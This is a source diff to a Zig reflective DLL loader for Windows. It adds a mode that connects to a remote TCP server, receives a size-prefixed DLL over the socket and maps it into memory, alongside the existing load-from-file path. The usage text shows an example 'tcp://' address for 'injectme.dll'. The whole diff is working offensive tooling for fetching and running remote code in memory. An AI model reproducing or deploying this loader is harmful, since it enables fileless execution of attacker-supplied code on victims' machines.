@@ -27,6 +27,11 @@ fn IMAGE_SNAP_BY_ORDINAL64(Ordinal: usize) bool {
     return (Ordinal & IMAGE_ORDINAL_FLAG64) != 0;
 }
 
+const FILE_TYPE = enum(u2) {
+    SHARE,
+    TCP,
+};
+
 const Action = struct {
     const Self = @This();
 
@@ -36,18 +41,26 @@ const Action = struct {
 
     allocator: std.mem.Allocator,
     dll: [:0]u8,
+    file_type: FILE_TYPE,
+    ip: []u8,
+    port: u16,
 
     pub fn init(allocator: std.mem.Allocator) !Self {
         return Self{
             .allocator = allocator,
             .dll = undefined,
+            .file_type = undefined,
+            .ip = undefined,
+            .port = 0,
         };
     }
 
     // big thanks to https://0xrick.github.io/win-internals/pe1/
 
     pub fn reflect(self: *Self) !i32 {
-        std.log.debug("reflect called {s}", .{self.dll});
+        std.log.debug("[+] reflect called", .{});
+        var dllBytes: ?*anyopaque = null;
+        var dllSize: u32 = 0;
 
         // get this module's image base address
         // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
@@ -59,50 +72,80 @@ const Action = struct {
         // defer utility.closeHandle(imagebase);
         // std.log.debug("imagebase :: {any}", .{@intFromPtr(imagebase)});
 
-        // load DLL into memory
-        // TODO: load from socket?
-        // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea
-        const dll = win32.CreateFileA(self.dll, win32.FILE_GENERIC_READ, win32.FILE_SHARE_NONE, null, win32.OPEN_EXISTING, win32.FILE_ATTRIBUTE_READONLY, null);
-        if (dll == win32.INVALID_HANDLE_VALUE) {
-            std.log.err("[-] Failed CreateFileA({s}) :: {d}", .{ self.dll, @intFromEnum(win32.GetLastError()) });
-            return Error.UnknownError;
-        }
-        defer utility.closeHandle(dll);
+        switch (self.file_type) {
+            .SHARE => {
+                std.log.debug("Reading file {s}", .{self.dll});
+                // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea
+                const dll = win32.CreateFileA(self.dll, win32.FILE_GENERIC_READ, win32.FILE_SHARE_NONE, null, win32.OPEN_EXISTING, win32.FILE_ATTRIBUTE_READONLY, null);
+                if (dll == win32.INVALID_HANDLE_VALUE) {
+                    std.log.err("[-] Failed CreateFileA({s}) :: {d}", .{ self.dll, @intFromEnum(win32.GetLastError()) });
+                    return Error.UnknownError;
+                }
+                defer utility.closeHandle(dll);
 
-        // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfilesize
-        const dllSize = win32.GetFileSize(dll, null);
-        if (dllSize == INVALID_FILESIZE) {
-            std.log.err("[-] Failed CreateFileA({s}) :: {d}", .{ self.dll, @intFromEnum(win32.GetLastError()) });
-            return Error.UnknownError;
-        }
+                // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfilesize
+                dllSize = win32.GetFileSize(dll, null);
+                if (dllSize == INVALID_FILESIZE) {
+                    std.log.err("[-] Failed CreateFileA({s}) :: {d}", .{ self.dll, @intFromEnum(win32.GetLastError()) });
+                    return Error.UnknownError;
+                }
 
-        // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-getprocessheap
-        const hHeap = win32.GetProcessHeap();
-        if (hHeap == null) {
-            std.log.err("[-] Failed GetProcessHeap() :: {d}", .{@intFromEnum(win32.GetLastError())});
-            return Error.UnknownError;
-        }
+                // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-getprocessheap
+                const hHeap = win32.GetProcessHeap();
+                if (hHeap == null) {
+                    std.log.err("[-] Failed GetProcessHeap() :: {d}", .{@intFromEnum(win32.GetLastError())});
+                    return Error.UnknownError;
+                }
 
-        // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
-        const dllBytes = win32.HeapAlloc(hHeap, win32.HEAP_ZERO_MEMORY, dllSize);
-        if (dllBytes == null) {
-            std.log.err("[-] Failed HeapAlloc(0x{x}) :: {d}", .{ dllSize, @intFromEnum(win32.GetLastError()) });
-            return Error.UnknownError;
-        }
-        const dllBytesAddr = @intFromPtr(dllBytes);
-        // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapfree
-        defer _ = win32.HeapFree(hHeap, win32.HEAP_ZERO_MEMORY, dllBytes);
+                // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
+                dllBytes = win32.HeapAlloc(hHeap, win32.HEAP_ZERO_MEMORY, dllSize);
+                if (dllBytes == null) {
+                    std.log.err("[-] Failed HeapAlloc(0x{x}) :: {d}", .{ dllSize, @intFromEnum(win32.GetLastError()) });
+                    return Error.UnknownError;
+                }
+                // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapfree
+                defer _ = win32.HeapFree(hHeap, win32.HEAP_ZERO_MEMORY, dllBytes);
 
-        var outSize: u32 = 0;
-        // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile
-        const retval = win32.ReadFile(dll, dllBytes, dllSize, &outSize, null);
+                var outSize: u32 = 0;
+                // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile
+                const retval = win32.ReadFile(dll, dllBytes, dllSize, &outSize, null);
 
-        if (outSize != dllSize or retval == 0) {
-            std.log.err("[-] Failed ReadFile({s}, {d}) :: {d}", .{ self.dll, dllSize, @intFromEnum(win32.GetLastError()) });
-            return Error.UnknownError;
+                if (outSize != dllSize or retval == 0) {
+                    std.log.err("[-] Failed ReadFile({s}, {d}) :: {d}", .{ self.dll, dllSize, @intFromEnum(win32.GetLastError()) });
+                    return Error.UnknownError;
+                }
+            },
+            .TCP => {
+                std.log.debug("Connecting to server {s}:{d}", .{ self.ip, self.port });
+                const stream = try std.net.tcpConnectToHost(self.allocator, self.ip, self.port);
+                var buffer: [8]u8 = std.mem.zeroes([8]u8);
+
+                std.log.debug("Reading size ", .{});
+
+                if (@sizeOf(u32) != try stream.readAtLeast(&buffer, @sizeOf(u32))) {
+                    std.log.err("[-] Failed to read DLL size", .{});
+                    return Error.UnknownError;
+                }
+
+                dllSize = std.mem.readInt(u32, buffer[0..@sizeOf(u32)], std.builtin.Endian.big);
+
+                std.log.debug("Read size : {d}", .{dllSize});
+
+                const dll = try self.allocator.alloc(u8, dllSize);
+
+                if (dllSize != try stream.readAll(dll)) {
+                    std.log.err("[-] Failed to read DLL", .{});
+                    return Error.UnknownError;
+                }
+
+                dllBytes = dll.ptr;
+
+                stream.close();
+            },
         }
 
         // get pointers to in-memory DLL headers
+        const dllBytesAddr = @intFromPtr(dllBytes);
         const base: usize = @intFromPtr(dllBytes.?);
         const DOSHeader = @as(*const win32.IMAGE_DOS_HEADER, @ptrFromInt(base)).*;
         const NTHeaderOffset: u32 = @intCast(DOSHeader.e_lfanew);
@@ -296,12 +339,31 @@ const Action = struct {
     }
 
     pub fn parseDLL(self: *Self, line: []u8) !void {
-        self.dll = try std.fmt.allocPrintZ(self.allocator, "{s}", .{line});
-        errdefer self.allocator.free(self.dll);
+        self.file_type = FILE_TYPE.SHARE;
+
+        if (std.mem.startsWith(u8, line, "tcp://")) {
+            self.file_type = FILE_TYPE.TCP;
+
+            var iter = std.mem.split(u8, line[6..], ":");
+            self.ip = try std.fmt.allocPrintZ(self.allocator, "{s}", .{iter.next().?});
+            errdefer self.allocator.free(self.ip);
+            self.port = std.fmt.parseInt(u16, iter.next().?, 10) catch 55555;
+
+            self.dll = try std.fmt.allocPrintZ(self.allocator, "{s}", .{""});
+            errdefer self.allocator.free(self.dll);
+        } else {
+            self.ip = try std.fmt.allocPrintZ(self.allocator, "{s}", .{""});
+            errdefer self.allocator.free(self.ip);
+            self.port = 0;
+
+            self.dll = try std.fmt.allocPrintZ(self.allocator, "{s}", .{line});
+            errdefer self.allocator.free(self.dll);
+        }
     }
 
     pub fn deinit(self: *Self) void {
         defer self.allocator.free(self.dll);
+        defer self.allocator.free(self.ip);
     }
 };
 
@@ -312,13 +374,14 @@ pub fn usage(argv: []u8) !void {
         \\
         \\Example:
         \\
-        \\ Attempt to take ownership of PID for the user 'pete':
-        \\ .\\{s} PID C:\\windows\\temp\\injectme.dll
+        \\ Attempt to load a DLL
+        \\ .\\{s} C:\\windows\\temp\\injectme.dll
+        \\ .\\{s} tcp://1.2.3.4:5678/injectme.dll
         \\
         \\ Show this menu
         \\ .\\{s} -h
         \\
-    , .{ argv, argv });
+    , .{ argv, argv, argv });
 
     std.posix.exit(0);
 }
